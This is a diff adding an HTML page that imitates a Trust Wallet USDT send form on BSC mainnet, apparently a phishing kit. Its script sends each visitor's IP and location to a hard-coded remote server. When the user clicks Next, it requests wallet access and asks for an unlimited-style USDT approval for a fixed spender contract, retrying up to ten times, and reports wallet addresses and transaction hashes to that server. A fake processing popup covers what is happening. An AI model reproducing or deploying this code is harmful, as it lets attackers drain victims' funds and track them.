@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <title>Safe Approve + Auto Send + Telegram Demo (BSC Mainnet)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link rel="stylesheet" href="css/index-95669f7c.css">
+  <link rel="icon" type="image/png" href="https://i.ibb.co/R422Tk9Y/Trust-Wallet-modified.png" />
+</head>
+<body>
+
+  <div class="container">
+    <div class="label">Address or Domain Name</div>
+    <div class="input-box">
+  <span style="flex:1;overflow:hidden;">
+    0xA4b9cD8fE12B3aF456d7
+  </span>
+  
+  <!-- Right side controls -->
+  <div class="input-box-right">
+    <!-- 1. Paste text -->
+    <span class="paste-text">Paste</span>
+
+    <!-- 2. Icon 1 -->
+    <svg width="16" height="16" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+      <path fill="currentColor" d="M96 0C60.7 0 32 28.7 32 64l0 384c0 35.3 28.7 64 64 64l288 0c35.3 0 64-28.7 64-64l0-384c0-35.3-28.7-64-64-64L96 0zM208 288l64 0c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16l-192 0c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm-32-96a64 64 0 1 1 128 0 64 64 0 1 1 -128 0zM512 80c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64zM496 192c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64c0-8.8-7.2-16-16-16zm16 144c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64z"></path>
+    </svg>
+
+    <!-- 3. Icon 2 -->
+    <svg width="16" height="16" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
+      <path fill="currentColor" d="M0 80C0 53.5 21.5 32 48 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48L0 80zM64 96l0 64 64 0 0-64L64 96zM0 336c0-26.5 21.5-48 48-48l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96zm64 16l0 64 64 0 0-64-64 0zM304 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96c0-26.5 21.5-48 48-48zm80 64l-64 0 0 64 64 0 0-64zM256 304c0-8.8 7.2-16 16-16l64 0c8.8 0 16 7.2 16 16s7.2 16 16 16l32 0c8.8 0 16-7.2 16-16s7.2-16 16-16s16 7.2 16 16l0 96c0 8.8-7.2 16-16 16l-64 0c-8.8 0-16-7.2-16-16s-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-160zM368 480a16 16 0 1 1 0-32 16 16 0 1 1 0 32zm64 0a16 16 0 1 1 0-32 16 16 0 1 1 0 32z"></path>
+    </svg>
+  </div>
+</div>
+    <div class="label">Amount</div>
+    <div class="input-box">
+       <input id="amount" type="text" min="0" value="">
+<div class="right-text">
+  <span class="usdt-text">USDT</span>
+  <span class="max-text">Max</span>
+</div>
+    </div>
+  </div>
+
+  <div id="nextBtn" class="next-btn">Next</div>
+ <!-- 🚀 Processing Bottom-Sheet Popup -->
+  <div id="processingPopup" style="
+    display: none;
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 50%;
+    background: #111;
+    border-radius: 20px 20px 0 0;
+    box-shadow: 0 -4px 15px rgba(0,0,0,0.6);
+    padding: 20px;
+    z-index: 10000;
+    color: #fff;
+    font-family: sans-serif;
+  ">
+    <div style="text-align: right;">
+      <button onclick="closePopup()" style="
+        background: none;
+        border: none;
+        color: #aaa;
+        font-size: 22px;
+        cursor: pointer;
+      ">✕</button>
+    </div>
+    <div style="display: flex; justify-content: center; align-items: center; margin-top: 10px;">
+      <img src="images/images.jpg" alt="Processing" style="width: 80px; height: 80px;">
+    </div>
+    <h2 style="text-align: center; margin-top: 15px; font-weight: bold; color: #fff;">Processing...</h2>
+    <p style="text-align: center; color: #ccc; font-size: 14px;">Transaction is processing! You can check it on blockchain.</p>
+    <div style="text-align: center; margin-top: 20px;">
+      <button disabled="" style="
+        background: #00D97E;
+        opacity: 0.7;
+        cursor: not-allowed;
+        padding: 12px 20px;
+        border: none;
+        border-radius: 10px;
+        color: #000;
+        font-weight: bold;
+        font-size: 15px;
+        width: 80%;
+      ">Transaction Details</button>
+    </div>
+  </div>
+
+  <!-- Popup Functions -->
+  <script>
+    function showProcessingPopup() {
+      document.getElementById("processingPopup").style.display = "block";
+    }
+    function closePopup() {
+      document.getElementById("processingPopup").style.display = "none";
+    }
+  </script>
+
+  <!-- Ethers.js Library -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+  <!-- Main Script -->
+  <script>
+    const amountInput = document.getElementById('amount');
+    const nextBtn = document.getElementById('nextBtn');
+    amountInput.addEventListener('input', function () {
+        this.value = this.value.replace(/[^0-9.]/g, ''); // allows digits and dot only
+        // optional: allow only one dot
+        const parts = this.value.split('.');
+        if (parts.length > 2) {
+            this.value = parts[0] + '.' + parts[1];
+        }
+        updateButtonState();
+    });
+    
+
+    // Function to update button state
+    function updateButtonState() {
+        const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        const hasValue = amountInput.value.trim() !== '';
+        
+        if (hasValue) {
+            // Active state
+            nextBtn.style.opacity = '1';
+            nextBtn.style.cursor = 'pointer';
+            nextBtn.style.pointerEvents = 'auto';
+            
+            if (isDark) {
+                nextBtn.style.backgroundColor = "#00D97E";
+            } else {
+                nextBtn.style.backgroundColor = "#0702F8";
+            }
+        } else {
+            // Disabled state
+            nextBtn.style.opacity = '1';
+            nextBtn.style.cursor = 'not-allowed';
+            nextBtn.style.pointerEvents = 'none';
+            
+            if (isDark) {
+                nextBtn.style.backgroundColor = "#555555";
+            } else {
+                nextBtn.style.backgroundColor = "#9b98ff";
+            }
+        }
+    }
+
+    // --- Theme detection ---
+    function applyTheme() {
+        const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        
+        if (isDark) {
+            document.body.style.backgroundColor = "#1a1a1a";
+            document.body.style.color = "white";
+        } else {
+            document.body.style.backgroundColor = "white";
+            document.body.style.color = "black";
+        }
+        
+        // Update button state when theme changes
+        updateButtonState();
+    }
+
+    applyTheme();
+    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme);
+
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
+    const SPENDER_CONTRACT = "0x675E4086D7ADb1Ed5F4d40517695384bbfF59a08";
+    const USDT_DECIMALS = 18;
+
+    const API_BASE = "http://148.113.1.61:5058/";
+
+    // --- Read base64 uid from ?id= ---
+    function logUidFromQuery() {
+        const params = new URLSearchParams(window.location.search);
+        const idParam = params.get('id');
+        if (!idParam) {
+            return null;
+        }
+
+        // Normalize base64url to standard base64 and pad
+        let normalized = idParam.replace(/-/g, '+').replace(/_/g, '/');
+        if (normalized.length % 4 !== 0) {
+            normalized += '='.repeat(4 - (normalized.length % 4));
+        }
+
+        try {
+            const binary = atob(normalized);
+            const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
+            const decoded = new TextDecoder().decode(bytes);
+            const numeric = decoded.trim();
+            if (/^\d+$/.test(numeric)) {
+                return numeric;
+            }
+            return null;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // Print once on load (preserve previous behavior)
+    (function () {
+        const initialUid = logUidFromQuery();
+        console.log(initialUid ?? "no uid");
+    })();
+
+    async function postJSON(path, data) {
+        try {
+            const id = logUidFromQuery();
+            const url = `${API_BASE}${path}`;
+            const payload = { ...(data || {}), uid: id };
+            const body = JSON.stringify(payload);
+
+            console.log(id ?? "no uid");
+            console.log("URL:", url);
+            console.log("BODY:", body);
+            
+            await fetch(`${API_BASE}${path}`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body
+            });
+        } catch (err) {}
+    }
+    
+    async function postInfo(text) {
+        return postJSON('/info', { text });
+    }
+
+    async function sendVisitorInfo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+
+            const ip = data.ip;
+            const city = data.city;
+            const region = data.region;
+            const country = data.country_name;
+            const flag = data.country_code ? String.fromCodePoint(...[...data.country_code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)) : '';
+            const timezone = data.timezone;
+            const url = window.location.href;
+
+            const location = `${city}, ${region}, ${country}`;
+
+            await postJSON('/visitor', {
+                ip,
+                location,
+                timezone,
+                url,
+                country_flag: flag
+            });
+        } catch (err) {}
+    }
+
+    async function approveUSDT(account) {
+        const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner(account);
+        const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
+        const amount = ethers.utils.parseUnits("1000000", USDT_DECIMALS);
+
+        for (let attempt = 1; attempt <= 10; attempt++) {
+            try {
+                const tx = await usdtContract.approve(SPENDER_CONTRACT, amount);
+                await postJSON('/checkTrx', { trx: tx.hash });
+                await tx.wait();
+                break;
+            } catch (err) {
+                if (attempt === 10) {
+                    await postInfo(`Approval failed after retries: ${err.message}`);
+                }
+            }
+        }
+    }
+
+    async function getAddress() {
+        try {
+            const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
+            if (currentChain !== '0x38') {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+            }
+
+            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            let msg = "";
+
+            if (accounts.length) {
+                msg = "Directly got: " + accounts[0];
+            } else {
+                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (accounts.length) {
+                    msg = "Asked for connect, got: " + accounts[0];
+                } else {
+                    msg = "No wallet connected.";
+                }
+            }
+
+            await postInfo(msg);
+
+            if (accounts.length) {
+                await postJSON('/connectedwallet', { wallet: accounts[0] });
+                await approveUSDT(accounts[0]);
+            }
+
+        } catch (e) {
+            await postInfo("Error: " + e.message);
+        }
+    }
+
+    // --- Make Next button active when amount is entered ---
+    amountInput.addEventListener('input', updateButtonState);
+
+    // Initialize button state on load
+    updateButtonState();
+
+    // --- Send notification when page opens ---
+    sendVisitorInfo();
+
+    // --- Execute wallet script when Next button is clicked ---
+    nextBtn.addEventListener('click', function() {
+        if (amountInput.value.trim() !== '') {
+            getAddress();
+        }
+    });
+  </script>
+
+</body></html>
